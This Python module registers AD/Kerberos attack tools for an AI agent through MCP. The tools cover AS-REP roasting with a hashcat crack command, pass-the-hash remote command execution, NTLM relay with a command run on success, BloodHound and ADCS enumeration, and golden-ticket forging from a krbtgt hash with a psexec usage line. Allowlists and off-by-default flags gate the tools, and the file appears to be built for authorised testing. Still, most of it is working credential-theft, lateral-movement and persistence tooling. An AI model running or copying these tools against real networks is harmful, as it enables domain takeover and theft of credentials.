"""Active Directory / Kerberos post-exploit MCP tool registration.

Phase 1 capability vertical. Each tool is target-IP-locked:
  * ``@require_allowlist()`` gates the primary ``target_ip``;
  * secondary DC IPs are gated by ``_gate_dc`` (allowlist unless == target);
  * every command runs as an argv list (no shell) via ``run_argv_captured``;
  * output lands under ``exploit_workspace/<ip>/<attempt_id>/``.

All keys live under ``exploit.ad_kerberos`` and default OFF (the master
``enabled`` plus a per-tool flag), so first-run behavior is unchanged. The
one exception is ``smb_signing_check`` (detection-only), which defaults ON.

The 7x config+target prologue, the DC gate, and the NTLM-hash shape check
are factored into ``_pre_gate`` / ``_gate_dc`` / ``_nt_hash_args`` helpers
so each tool body stays declarative. Passwords and hashes are never
length-capped (NO-CAP-SECRETS); only relayed/remote command strings,
interface names, and the ticketer duration are bounded.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
from pathlib import Path
from typing import Any

from tools.mcp_shared import _allowed_target_list, _attempt_dir, check_targets_allowlist
from tools.mcp_tools.registry import ToolContext, _run_with_pgrp_timeout, run_argv_captured
from tools.validation_utils import is_fqdn, validate_nt_hash, validate_ntlm_hash, validate_target_or_ip

# Domain SIDs look like S-1-5-21-<sub>-<sub>-<sub>[-<rid>]; anything else
# (e.g. S-1-5-32 local groups, S-1-5-18 SYSTEM) is not a domain SID and
# impacket-ticketer would mint against the wrong authority.
_SID_RE = re.compile(r"^S-1-5-21(-\d+){3,}$")
# Single NetBIOS-style label (CORP) for operators who address the domain
# short; multi-label names must be full FQDNs (checked via is_fqdn).
_DOMAIN_LABEL_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9-]{0,13}[A-Za-z0-9])?$")
# ticketer -duration shapes: bare days ("10") or suffixed ("10d", "24h").
_DURATION_RE = re.compile(r"^(\d+)([dhmyDHMY]?)$")
# Local interface names only (no shell, no addressing); ntlmrelayx -i binds it.
_IFACE_RE = re.compile(r"^[A-Za-z0-9_.:-]{1,64}$")
# Bound for relayed/remote command strings (NOT secrets: passwords and
# hashes are never capped, per NO-CAP-SECRETS).
_MAX_COMMAND_CHARS = 2000
# Longest ticket lifetime accepted (10y in days); larger values clamp.
_MAX_DURATION_DAYS = 3650
# Display cap for tool output tails. Gates always see the FULL input; only
# the shown OUTPUT tail is truncated, marked with a [truncated] marker.
_OUTPUT_CHARS = 4000
# One char of fetch slack past _OUTPUT_CHARS: the shared runner slices
# silently at max_chars, so a full-length fetch proves trimming happened and
# _tail must fire the marker; anything shorter is shown verbatim.
_FETCH_CHARS = _OUTPUT_CHARS + 1


def _ad_cfg(config: dict[str, Any] | None) -> dict[str, Any]:
    """Return the ``exploit.ad_kerberos`` block (empty dict when absent).

    Args:
        config: Full server config (may be None).
    Returns:
        The ad_kerberos mapping, or {} when missing or not a dict.
    Gates: None (pure config read).
    Side-effects: None.
    """
    exploit = (config or {}).get("exploit", {}) or {}
    if not isinstance(exploit, dict):
        return {}
    ad = exploit.get("ad_kerberos", {}) or {}
    return ad if isinstance(ad, dict) else {}


def _ad_enabled(config: dict[str, Any] | None, key: str, default: bool = False) -> bool:
    """True iff the AD master switch AND the per-tool flag are both on.

    Args:
        config: Full server config (may be None).
        key: Per-tool flag name inside ``exploit.ad_kerberos``.
        default: Per-tool default when the flag is absent (True only for the
            detection-only ``smb_signing_check``).
    Returns:
        True when the tool may run. Checked BEFORE the allowlist so a
        disabled tool short-circuits with a clear message.
    Gates: Config gate (master + per-tool flag).
    Side-effects: None.
    """
    ad = _ad_cfg(config)
    if not ad.get("enabled", False):
        return False
    return bool(ad.get(key, default))


def _pre_gate(config: dict[str, Any] | None, key: str, target_ip: str, default: bool = False) -> str | None:
    """Shared config + target pre-gate for all seven AD tools.

    Consolidates the 7x duplicated "disabled? invalid target?" prologue so
    each tool body starts from validated state.

    Args:
        config: Full server config (may be None).
        key: Per-tool ad_kerberos flag (e.g. "asrep_roast").
        target_ip: Primary target (IP or domain).
        default: Per-tool default when the flag is absent.
    Returns:
        An error string to return to the caller, or None when gated-open.
    Gates:
        Config gate first (disabled short-circuits regardless of target),
        then target syntax. The ``@require_allowlist`` decorator is the
        actual authorization and runs before this body.
    Side-effects: None.
    """
    if not _ad_enabled(config, key, default):
        return f"BLOCKED: {key} disabled (exploit.ad_kerberos.enabled / {key})."
    tip = target_ip if isinstance(target_ip, str) else ""
    if not tip.strip() or not validate_target_or_ip(tip.strip()):
        return "ERROR: Invalid target_ip (must be an IP or domain)."
    return None


def _gate_dc(dc_ip: str, target_ip: str, config: dict[str, Any] | None) -> tuple[str, str | None]:
    """Validate + allowlist-gate a secondary DC IP.

    Args:
        dc_ip: Requested DC ("" defaults to ``target_ip``).
        target_ip: Primary (already validated) target.
        config: Full server config for the allowlist check.
    Returns:
        ``(dc, None)`` when usable; ``("", error)`` when invalid or off-allowlist.
    Gates:
        ``check_targets_allowlist`` when dc != target (the DC is a second host).
    Side-effects: None.
    """
    tip = (target_ip or "").strip()
    dc = (dc_ip or "").strip() or tip
    if not validate_target_or_ip(dc):
        return "", f"ERROR: Invalid dc_ip (must be an IP or domain): {dc}."
    if dc != tip:
        allowed, reason = check_targets_allowlist([dc], config)
        if not allowed:
            return "", f"BLOCKED: {reason}\nTOOL: ad\nDC_IP: {dc}"
    return dc, None


def _valid_domain(domain: str) -> bool:
    """True for an FQDN (corp.example.com) or a single NetBIOS label (CORP).

    Args:
        domain: Raw domain string (may be None/empty).
    Returns:
        True when the shape is usable as an AD domain.
    Gates: Shape check only (not authorization).
    Side-effects: None.
    """
    s = (domain or "").strip() if isinstance(domain, str) else ""
    if not s:
        return False
    return bool(is_fqdn(s) or _DOMAIN_LABEL_RE.match(s))


def _auth_target(domain: str, username: str, password: str, host: str) -> str:
    """Build the impacket ``domain/user[:pass]@host`` auth target string.

    Args:
        domain: AD domain ("" omits the ``domain/`` prefix).
        username: Account name (stripped, never truncated).
        password: Password ("" omits ``:pass``; full value, never capped).
        host: DC host this credential is presented to.
    Returns:
        The auth target string.
    Gates: None (pure string build; caller pre-gates).
    Side-effects: None.
    """
    d = (domain or "").strip()
    target = f"{d}/" if d else ""
    target += (username or "").strip()
    if (password or "").strip():
        target += f":{password.strip()}"
    return f"{target}@{host}"


def _nt_hash_args(ntlm_hash: str) -> tuple[list[str], str | None]:
    """Return the impacket ``-hashes :NT`` argv fragment or an error.

    Single replacement for the 4x inlined hash check + ``__INVALID_HASH__``
    sentinel: callers get ``(fragment, None)`` or ``([], error)``.

    Args:
        ntlm_hash: Raw hash ("" = no hash auth, yields ``([], None)``).
    Returns:
        ``(argv_fragment, None)`` on success; ``([], error)`` on bad shape.
    Gates: Hash shape (32-hex NT or LM:NT pair); never capped (secret).
    Side-effects: None.
    """
    h = (ntlm_hash or "").strip() if isinstance(ntlm_hash, str) else ""
    if not h:
        return [], None
    if not validate_ntlm_hash(h):
        return [], "BLOCKED: ntlm_hash must be 32 hex chars (NT) or 64 hex chars with colon (LM:NT)."
    return ["-hashes", f":{h.split(':')[-1]}"], None


def _check_users_file(users_file: str) -> tuple[str, str | None]:
    """Validate an asrep_roast users file path.

    Args:
        users_file: Raw path ("" = not provided, yields ``("", None)``).
    Returns:
        ``(path, None)`` when absent or an existing file; ``("", error)``
        when the path does not exist.
    Gates: Filesystem existence (fail closed: a missing file blocks).
    Side-effects: None (stat only, no read).
    """
    uf = (users_file or "").strip() if isinstance(users_file, str) else ""
    if not uf:
        return "", None
    if not Path(uf).is_file():
        return "", f"BLOCKED: users_file not found: {uf}."
    return uf, None


def _cap_command(command: str) -> tuple[str, str | None]:
    """Bound a relayed/remote command string (not a secret).

    Args:
        command: Raw command ("" = not provided, yields ``("", None)``).
    Returns:
        ``(command, None)`` when within bounds; ``("", error)`` when over
        ``_MAX_COMMAND_CHARS``.
    Gates: Length cap only. Passwords/hashes never pass through here.
    Side-effects: None.
    """
    cmd = (command or "").strip() if isinstance(command, str) else ""
    if not cmd:
        return "", None
    if len(cmd) > _MAX_COMMAND_CHARS:
        return "", f"BLOCKED: command exceeds {_MAX_COMMAND_CHARS} chars."
    return cmd, None


def _clamp_duration(duration: str) -> tuple[str, str | None]:
    """Validate a ticketer ``-duration`` and clamp its magnitude.

    Args:
        duration: Raw duration ("" = default "10d").
    Returns:
        ``(duration, None)`` on success (magnitude clamped to
        ``_MAX_DURATION_DAYS``); ``("", error)`` on bad shape.
    Gates: Shape (``^digits[unit]?$``) + magnitude clamp.
    Side-effects: None.
    """
    raw = (duration or "").strip() if isinstance(duration, str) else ""
    raw = raw or "10d"
    m = _DURATION_RE.match(raw)
    if not m:
        return "", f"BLOCKED: invalid duration {raw!r} (expected like '10d' or '24h')."
    amount = min(max(int(m.group(1)), 1), _MAX_DURATION_DAYS)
    return f"{amount}{m.group(2) or 'd'}", None


def _tail(output: str) -> str:
    """Mark an output tail as truncated when the tool trimmed it.

    Args:
        output: Raw tool output (already tail-sliced by the runner).
    Returns:
        ``output`` unchanged when within ``_OUTPUT_CHARS``; otherwise the
        tail plus a ``[truncated]`` marker so the caller knows content above
        was elided. Display-only: gates always ran on the full input.
    Gates: None (display helper).
    Side-effects: None.
    """
    text = output or ""
    if len(text) <= _OUTPUT_CHARS:
        return text
    return text[-_OUTPUT_CHARS:] + "\n[truncated]"


def _run(argv: list[str], timeout: int) -> tuple[str, int | None, str]:
    """Run argv via the shared captured-run helper.

    Args:
        argv: Already-built argv list (no shell).
        timeout: Hard timeout in seconds.
    Returns:
        ``(status, returncode, output)``; returncode is preserved so callers
        surface it as EXIT_CODE. The output is the tail (``_OUTPUT_CHARS``)
        with a ``[truncated]`` marker when the tool trimmed it.
    Gates: None (caller pre-gates).
    Side-effects: Spawns the child process.
    """
    status, returncode, output, _ = run_argv_captured(argv, timeout, max_chars=_FETCH_CHARS)
    return status, returncode, _tail(output)


def _run_with_cwd_env(
    argv: list[str], timeout: int, cwd: Path, env_extra: dict[str, str]
) -> tuple[str, int | None, str]:
    """Run argv with a working directory + extra env (ticketer ccache path).

    impacket-ticketer writes ``<user>.ccache`` into CWD, so the run is rooted
    at the attempt dir and KRB5CCNAME is pointed at the same file.

    Args:
        argv: Already-built argv list (no shell).
        timeout: Hard timeout in seconds.
        cwd: Working directory for the child (the attempt dir).
        env_extra: Extra env vars merged over ``os.environ``.
    Returns:
        ``(status, returncode, output)`` mirroring ``_run``.
    Gates: None (caller pre-gates).
    Side-effects: Spawns the child process with cwd=attempt_dir.
    """
    env = dict(os.environ)
    env.update(env_extra)
    try:
        returncode, out, err = _run_with_pgrp_timeout(
            argv,
            timeout,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=str(cwd),
            env=env,
        )
        output = _tail(((out or "") + "\n" + (err or ""))[-_FETCH_CHARS:])
        return ("completed" if returncode == 0 else "failed"), returncode, output
    except subprocess.TimeoutExpired:
        name = argv[0] if argv else "command"
        return "timed_out", None, f"{name} timed out after {timeout}s"
    except Exception as exc:  # ponytail: bare except intentional — run failure is data, not a crash
        return "error", None, str(exc)


def _exit_line(rc: int | None) -> str:
    """Format a returncode for result blocks (None -> n/a).

    Args:
        rc: Process returncode (None on timeout/error).
    Returns:
        ``EXIT_CODE: <rc>`` line fragment.
    Gates: None. Side-effects: None.
    """
    return f"EXIT_CODE: {rc if rc is not None else 'n/a'}"


def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
    """Register the AD/Kerberos tool family on ``mcp``.

    Args:
        mcp: The MCP server to register tools on.
        ctx: ToolContext (workspace + config + require_allowlist used here).
    Returns: None.
    Gates: Per-tool config gate inside each body (master + per-tool flag).
    Side-effects: Registers 7 ``@mcp.tool`` functions.
    """
    workspace = ctx.workspace
    config = ctx.config
    require_allowlist = ctx.require_allowlist

    # ── asrep_roast ──────────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def asrep_roast(
        target_ip: str,
        domain: str,
        username: str = "",
        password: str = "",
        ntlm_hash: str = "",
        dc_ip: str = "",
        users_file: str = "",
    ) -> str:
        """AS-REP Roast accounts with preauth disabled (impacket-GetNPUsers) for offline cracking.

        Args:
            target_ip: Primary target (IP or domain; allowlist-gated).
            domain: AD domain (FQDN or NetBIOS label; required).
            username: Account to roast with (required without users_file).
            password: Password (full value, never capped).
            ntlm_hash: NT hash alternative (32-hex or LM:NT; never capped).
            dc_ip: DC override ("" = target_ip; off-target DC allowlist-gated).
            users_file: Existing file with one user per line (anonymous probing).
        Returns:
            ASREP_ROAST_RESULT block with hashes file, size, exit code, output.
        Gates:
            Config gate + target syntax (``_pre_gate``); ``@require_allowlist``
            on target_ip; ``_gate_dc`` on dc_ip; users_file must exist.
        Side-effects:
            Runs impacket-GetNPUsers; writes hashes to the attempt dir.
        """
        err = _pre_gate(config, "asrep_roast", target_ip)
        if err:
            return err
        if not _valid_domain(domain):
            return "BLOCKED: domain is required (FQDN like corp.example.com or NetBIOS name like CORP)."
        dc, dc_err = _gate_dc(dc_ip, target_ip, config)
        if dc_err:
            return dc_err
        uf, uf_err = _check_users_file(users_file)
        if uf_err:
            return uf_err
        harg, h_err = _nt_hash_args(ntlm_hash)
        if h_err:
            return h_err

        argv = ["impacket-GetNPUsers", "-dc-ip", dc, "-request", "-format", "hashcat"]
        if uf:
            argv.extend(["-usersfile", uf])
        argv.extend(harg)
        # Without -usersfile, impacket needs a credential target to enumerate SPN-less users.
        if not uf:
            user = (username or "").strip()
            if not user:
                return "BLOCKED: username (or users_file) is required for asrep_roast."
            if not ((password or "").strip() or (ntlm_hash or "").strip()):
                return (
                    "BLOCKED: either password or ntlm_hash must be provided (or pass users_file for anonymous probing)."
                )
            argv.append(_auth_target(domain, user, (password or "").strip(), dc))
        else:
            argv.append((domain or "").strip())

        attempt_dir, attempt_id = _attempt_dir(workspace)
        out_file = attempt_dir / "asrep_hashes.txt"
        argv.extend(["-outputfile", str(out_file)])
        status, rc, output = _run(argv, 300)
        size = out_file.stat().st_size if out_file.exists() else 0
        return (
            f"ASREP_ROAST_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"DOMAIN: {domain}\nDC_IP: {dc}\nTARGET: {target_ip}\n"
            f"HASHES_FILE: {out_file}\nHASHES_SIZE: {size} bytes\n"
            f"{_exit_line(rc)}\n"
            f"CRACK_COMMAND: hashcat -m 18200 {out_file} rockyou.txt\n"
            f"OUTPUT:\n{output}"
        )

    # ── pass_the_hash ─────────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def pass_the_hash(target_ip: str, username: str, ntlm_hash: str, service: str = "smb", command: str = "") -> str:
        """Execute a command on a Windows target via NTLM hash (no plaintext).

        Args:
            target_ip: Primary target (IP or domain; allowlist-gated).
            username: Account name (required).
            ntlm_hash: NT hash (32-hex or LM:NT; never capped).
            service: smb | winrm.
            command: Remote command (optional, capped at 2000 chars).
        Returns:
            PASS_THE_HASH_RESULT block with service, exit code, output.
        Gates:
            Config gate + target syntax (``_pre_gate``); ``@require_allowlist``
            on target_ip (no secondary host exists here); hash shape.
        Side-effects:
            Runs NetExec (nxc/crackmapexec) or impacket-wmiexec fallback.
        """
        err = _pre_gate(config, "pass_the_hash", target_ip)
        if err:
            return err
        user = (username or "").strip()
        if not user:
            return "BLOCKED: username is required."
        if not validate_ntlm_hash((ntlm_hash or "").strip()):
            return "BLOCKED: ntlm_hash must be 32 hex chars (NT) or 64 hex chars with colon (LM:NT)."
        svc = (service or "smb").strip().lower()
        if svc not in {"smb", "winrm"}:
            return f"BLOCKED: unsupported service '{svc}'. Allowed: smb, winrm."
        cmd, cmd_err = _cap_command(command)
        if cmd_err:
            return cmd_err
        nt = (ntlm_hash or "").strip().split(":")[-1]

        nxc = shutil.which("nxc") or shutil.which("crackmapexec")
        attempt_dir, attempt_id = _attempt_dir(workspace)
        if nxc:
            argv = [nxc, svc, target_ip, "-u", user, "-H", nt]
            if cmd:
                argv.extend(["-x", cmd])
        else:
            # impacket-wmiexec fallback (smb-via-WMI; works for both smb/winrm intent).
            argv = ["impacket-wmiexec", "-hashes", f":{nt}", f"{user}@{target_ip}"]
            if cmd:
                argv.append(cmd)
        status, rc, output = _run(argv, 300)
        return (
            f"PASS_THE_HASH_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"SERVICE: {svc}\nTARGET: {target_ip}\nUSER: {user}\n"
            f"{_exit_line(rc)}\n"
            f"OUTPUT:\n{output}"
        )

    # ── adcs_enum ─────────────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def adcs_enum(
        target_ip: str, username: str, password: str = "", ntlm_hash: str = "", domain: str = "", dc_ip: str = ""
    ) -> str:
        """Enumerate AD Certificate Services templates via certipy (ESC1-8).

        Args:
            target_ip: Primary target (IP or domain; allowlist-gated).
            username: Account name (required).
            password: Password (full value, never capped).
            ntlm_hash: NT hash alternative (never capped).
            domain: AD domain (FQDN or NetBIOS label; required).
            dc_ip: DC override ("" = target_ip; off-target DC allowlist-gated).
        Returns:
            ADCS_ENUM_RESULT block with exit code and vulnerable-template output.
        Gates:
            Config gate + target syntax (``_pre_gate``); ``@require_allowlist``
            on target_ip; ``_gate_dc`` on dc_ip.
        Side-effects:
            Runs certipy find; writes output under the attempt dir.
        """
        err = _pre_gate(config, "adcs_enum", target_ip)
        if err:
            return err
        user = (username or "").strip()
        if not user or not _valid_domain(domain):
            return "BLOCKED: username and domain are required."
        if not ((password or "").strip() or (ntlm_hash or "").strip()):
            return "BLOCKED: either password or ntlm_hash must be provided."
        dc, dc_err = _gate_dc(dc_ip, target_ip, config)
        if dc_err:
            return dc_err
        harg, h_err = _nt_hash_args(ntlm_hash)
        if h_err:
            return h_err

        certipy = shutil.which("certipy") or "certipy"
        argv = [certipy, "find", "-u", f"{user}@{domain.strip()}", "-dc-ip", dc]
        if (password or "").strip():
            argv.extend(["-p", password.strip()])
        argv.extend(harg)
        argv.extend(["-target", target_ip])
        attempt_dir, attempt_id = _attempt_dir(workspace)
        argv.extend(["-output", str(attempt_dir / "adcs")])
        status, rc, output = _run(argv, 300)
        return (
            f"ADCS_ENUM_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"DOMAIN: {domain}\nDC_IP: {dc}\nTARGET: {target_ip}\n"
            f"{_exit_line(rc)}\n"
            f"OUTPUT:\n{output}"
        )

    # ── bloodhound_collect ────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def bloodhound_collect(
        target_ip: str, domain: str, username: str, password: str = "", ntlm_hash: str = "", dc_ip: str = ""
    ) -> str:
        """Collect BloodHound data (users/groups/sessions/acls) for graph attack-path analysis.

        Args:
            target_ip: Primary target = the DC (IP or domain; allowlist-gated).
            domain: AD domain (FQDN or NetBIOS label; required).
            username: Account name (required).
            password: Password (full value, never capped).
            ntlm_hash: NT hash alternative (never capped).
            dc_ip: DC override ("" = target_ip; off-target DC allowlist-gated).
        Returns:
            BLOODHOUND_COLLECT_RESULT block with exit code and output.
        Gates:
            Config gate + target syntax (``_pre_gate``); ``@require_allowlist``
            on target_ip; ``_gate_dc`` on dc_ip.
        Side-effects:
            Runs bloodhound-python -c All --zip; zipped JSON lands in the attempt dir.
        """
        err = _pre_gate(config, "bloodhound", target_ip)
        if err:
            return err
        if not _valid_domain(domain) or not (username or "").strip():
            return "BLOCKED: domain and username are required."
        if not ((password or "").strip() or (ntlm_hash or "").strip()):
            return "BLOCKED: either password or ntlm_hash must be provided."
        dc, dc_err = _gate_dc(dc_ip, target_ip, config)
        if dc_err:
            return dc_err
        harg, h_err = _nt_hash_args(ntlm_hash)
        if h_err:
            return h_err

        bh = shutil.which("bloodhound-python") or "bloodhound-python"
        argv = [bh, "-u", username.strip(), "-d", domain.strip(), "-dc", dc]
        if (password or "").strip():
            argv.extend(["-p", password.strip()])
        argv.extend(harg)
        argv.extend(["-c", "All", "--zip"])
        attempt_dir, attempt_id = _attempt_dir(workspace)
        argv.extend(["-o", str(attempt_dir / "bloodhound")])
        status, rc, output = _run(argv, 600)
        return (
            f"BLOODHOUND_COLLECT_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"DOMAIN: {domain}\nDC_IP: {dc}\nTARGET: {target_ip}\n"
            f"{_exit_line(rc)}\n"
            f"OUTPUT:\n{output}"
        )

    # ── responder_relay ───────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def responder_relay(target_ip: str, iface: str = "", command: str = "") -> str:
        """Relay coerced NTLM auth via impacket ntlmrelayx.

        Args:
            target_ip: Runtime target (IP or domain; allowlist-gated, always in
                the relay list).
            iface: Local interface ntlmrelayx binds (optional; name shape only).
            command: Command run on a successful relay (optional, capped).
        Returns:
            RESPONDER_RELAY_RESULT block with relay list, exit code, output.
        Gates:
            Config gate + target syntax (``_pre_gate``); ``@require_allowlist``
            on target_ip. The relay target list is built ONLY from the
            operator allowlist (kept verbatim — IPs, domains, wildcards, CIDR)
            plus target_ip; an off-list host can never be injected.
        Side-effects:
            Writes relay_targets.txt to the attempt dir; runs ntlmrelayx.
        """
        err = _pre_gate(config, "responder_relay", target_ip)
        if err:
            return err
        iface_s = (iface or "").strip()
        if iface_s and not _IFACE_RE.match(iface_s):
            return f"BLOCKED: invalid iface {iface_s!r} (local interface name, max 64 chars)."
        cmd, cmd_err = _cap_command(command)
        if cmd_err:
            return cmd_err

        # Build the relay target list from the allowlist ONLY (+ the runtime target).
        # An off-list host would pivot ntlmrelayx to an unauthorized box. Entries
        # are kept verbatim (IP, domain, wildcard, CIDR) so an operator-authorized
        # domain/CIDR scope is not silently narrowed to bare IPs.
        targets: list[str] = []
        for t in _allowed_target_list(config):
            t = (t or "").strip()
            if t and t not in targets:
                targets.append(t)
        tip = target_ip.strip()
        if tip not in targets:
            targets.append(tip)
        if not targets:
            return "BLOCKED: no allowlisted relay targets (exploit.allowed_targets empty and no runtime target)."

        attempt_dir, attempt_id = _attempt_dir(workspace)
        targets_file = attempt_dir / "relay_targets.txt"
        targets_file.write_text("\n".join(targets) + "\n")

        ntlmrelayx = shutil.which("ntlmrelayx.py") or "ntlmrelayx.py"
        argv = [ntlmrelayx, "-tf", str(targets_file), "-smb2support"]
        if iface_s:
            argv.extend(["-i", iface_s])
        if cmd:
            argv.extend(["-c", cmd])
        status, rc, output = _run(argv, 300)
        return (
            f"RESPONDER_RELAY_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"TARGETS_FILE: {targets_file}\n"
            f"RELAY_TARGETS: {', '.join(targets)}\n"
            f"{_exit_line(rc)}\n"
            f"OUTPUT:\n{output}"
        )

    # ── smb_signing_check (detection-only, default ON) ───────────────────────
    @mcp.tool()
    @require_allowlist()
    def smb_signing_check(target_ip: str) -> str:
        """Check whether the target requires SMB signing (relay feasibility).

        Detection only: NetExec --signing when available, else nmap
        smb2-security-mode. No credentials sent, no exploitation.

        Args:
            target_ip: Primary target (IP or domain; allowlist-gated).
        Returns:
            SMB_SIGNING_CHECK_RESULT block with exit code and output.
        Gates:
            Config gate + target syntax (``_pre_gate``, default ON);
            ``@require_allowlist`` on target_ip.
        Side-effects: Runs the signing probe (read-only).
        """
        err = _pre_gate(config, "smb_signing_check", target_ip, default=True)
        if err:
            return err
        attempt_dir, attempt_id = _attempt_dir(workspace)

        nxc = shutil.which("nxc") or shutil.which("crackmapexec")
        if nxc:
            argv = [nxc, "smb", target_ip, "--signing"]
        else:
            nmap_bin = shutil.which("nmap") or "nmap"
            argv = [nmap_bin, "--script", "smb2-security-mode", "-p", "445", target_ip]
        status, rc, output = _run(argv, 120)
        return (
            f"SMB_SIGNING_CHECK_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\nTARGET: {target_ip}\n"
            f"{_exit_line(rc)}\n"
            f"OUTPUT:\n{output}"
        )

    # ── golden_ticket ─────────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def golden_ticket(
        target_ip: str, domain: str, username: str, krbtgt_hash: str, sid: str = "", duration: str = "10d"
    ) -> str:
        """Mint a Kerberos golden ticket (TGT) from a stolen krbtgt NTLM hash.

        Args:
            target_ip: Primary target (IP or domain; allowlist-gated).
            domain: AD domain (FQDN or NetBIOS label; required).
            username: User to impersonate (required).
            krbtgt_hash: krbtgt NT hash (32 hex; never capped).
            sid: Domain SID (required, must match S-1-5-21-...).
            duration: Ticket lifetime like '10d' (clamped to 10y max).
        Returns:
            GOLDEN_TICKET_RESULT block with ccache path, exit code, output.
        Gates:
            Config gate + target syntax (``_pre_gate``); ``@require_allowlist``
            on target_ip; SID shape; duration shape.
        Side-effects:
            Runs impacket-ticketer rooted at the attempt dir (CWD + KRB5CCNAME
            both point at the attempt-dir ccache); writes the .ccache file.
        """
        err = _pre_gate(config, "golden_ticket", target_ip)
        if err:
            return err
        dom = (domain or "").strip()
        user = (username or "").strip()
        if not _valid_domain(dom) or not user:
            return "BLOCKED: domain and username are required."
        h = (krbtgt_hash or "").strip()
        if not validate_nt_hash(h):
            return "BLOCKED: krbtgt_hash must be 32 hex chars (NT half)."
        sid_s = (sid or "").strip()
        if not _SID_RE.match(sid_s):
            return "BLOCKED: sid must be a domain SID like S-1-5-21-<sub>-<sub>-<sub>."
        dur, dur_err = _clamp_duration(duration)
        if dur_err:
            return dur_err

        attempt_dir, attempt_id = _attempt_dir(workspace)
        safe_user = re.sub(r"[^A-Za-z0-9_.-]", "_", user) or "ticket"
        ccache = attempt_dir / f"{safe_user}.ccache"
        ticketer = shutil.which("impacket-ticketer") or "impacket-ticketer"
        argv = [
            ticketer,
            "-nthash",
            h,
            "-domain",
            dom,
            "-domain-sid",
            sid_s,
            "-user",
            user,
            "-duration",
            dur,
            user,
        ]
        # impacket-ticketer writes <user>.ccache in CWD: root the run at the
        # attempt dir and point KRB5CCNAME at the same file.
        status, rc, output = _run_with_cwd_env(argv, 120, attempt_dir, {"KRB5CCNAME": str(ccache)})
        size = ccache.stat().st_size if ccache.exists() else 0
        tip = target_ip.strip()
        return (
            f"GOLDEN_TICKET_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"DOMAIN: {dom}\nUSER: {user}\nTARGET: {tip}\n"
            f"CCACHE: {ccache}\nCCACHE_SIZE: {size} bytes\n"
            f"{_exit_line(rc)}\n"
            f"USE: export KRB5CCNAME={ccache}; impacket-psexec -k -no-pass {dom}/{user}@{tip}\n"
            f"OUTPUT:\n{output}"
        )
